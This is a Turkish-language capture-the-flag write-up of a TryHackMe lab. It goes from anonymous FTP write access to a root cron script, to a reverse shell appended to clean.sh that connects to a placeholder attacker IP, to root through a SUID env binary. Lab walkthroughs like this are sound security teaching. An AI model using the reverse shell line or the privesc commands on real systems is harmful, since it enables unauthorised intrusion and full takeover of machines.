# Anonymous

**Platform:** TryHackMe · **Zorluk:** Medium · **OS:** Linux
**Zincir:** FTP (anonymous write) → root cron script → SUID env → root

## Keşif (Enumeration)

```
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X
```

Dört açık port gördüm. Planım: SMB paylaşımlarını ve FTP sunucusunu taramak, parola
kırmak yerine bir yazma (write) imkânı aramak.

## Foothold

- **SMB (139/445):** Üç paylaşım — `print$`, `pics`, `IPC$`. `pics` içinde sadece
  resimler vardı. Çıkmaz sokak.
- **FTP (21) — anonymous login:** `/scripts` dizininde üç dosya vardı:
  - `clean.sh` → bir temizlik script'i.
  - `removed_files.log` → ~40 satır `Running cleanup script: nothing to delete`.
  - `to_do.txt` → *"anonymous login'i kapatmam lazım...güvenli değil."*
- **Kritik gözlem:** log belirli aralıklarla büyüyor → `clean.sh` root tarafından
  periyodik çalıştırılıyor. `/scripts` dizini anonymous FTP ile yazılabilir. İkisi
  birlikte: root'un çalıştırdığı script'in üzerine yazabilirim.
- **Sömürü:** **mevcut** `clean.sh`'in sonuna bir reverse shell ekledim (yeni dosya
  değil — cron sadece `clean.sh`'i çağırıyor), listener açtım, tekrar yükledim:
  ```
  # clean.sh sonuna eklendi (saldırgan IP'si):
  /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1

  nc -lvnp <PORT>
  ```
  Bir sonraki cron tetiklemesinde → `namelessone` olarak shell.

## Privilege Escalation

- `find / -perm -4000 2>/dev/null` → `/usr/bin/env` SUID bit'ine sahip.
- GTFOBins'te `env` → SUID tekniği:
  ```
  /usr/bin/env /bin/sh -p
  ```
  `-p` bayrağı şart, yoksa shell yetkiyi düşürür.
- `id` → `euid=0(root)` → `/root/root.txt`.

## Takıldığım Yerler

- **Saldırgan vs hedef IP:** Reverse shell satırına önce *hedefin* IP'sini yazdım.
  Hedef bana değil kendine bağlanmaya çalıştı. Kural: **FTP hedef IP'sine bağlanır;
  reverse shell satırında BENİM IP'm olmalı** — hedef bana geri döner.
- **Yanlış dosya:** Önce yeni bir `put.sh` yükledim. Cron onu görmez — payload,
  cron'un zaten çalıştırdığı dosyanın (`clean.sh`) içine girmeli.
- **SUID binary'de `sudo`:** `sudo env /bin/sh -p` çalıştırıp `no tty present` aldım.
  SUID zaten yetkiyi veriyor — burada `sudo` yanlış.
- **Dumb shell prompt değiştirmiyor:** `env /bin/sh -p` sonrası prompt aynı kaldı,
  başarısız sandım ve `exit` yazıp kendi root shell'imden çıktım. Çıkarım: privesc
  komutundan sonra `id` çek, `euid=0`'a bak — prompt'a güvenme.
